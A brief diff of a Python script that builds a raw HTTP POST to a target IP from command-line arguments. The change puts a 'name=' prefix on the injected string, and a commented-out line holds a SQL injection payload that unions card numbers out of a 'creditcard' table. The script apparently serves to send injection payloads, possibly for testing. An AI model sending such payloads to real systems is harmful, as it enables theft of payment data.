@@ -33,7 +33,7 @@ destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 
 #injection_string = '1 UNION ALL SELECT cardnumber,1 FROM creditcard WHERE "1"="1'
-injection_string = sys.argv[3]
+injection_string = "name=" + sys.argv[3]
 cont_length = len(injection_string)
 getStr = 'POST / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + str(cont_length) + '\r\n\r\n' + injection_string
 
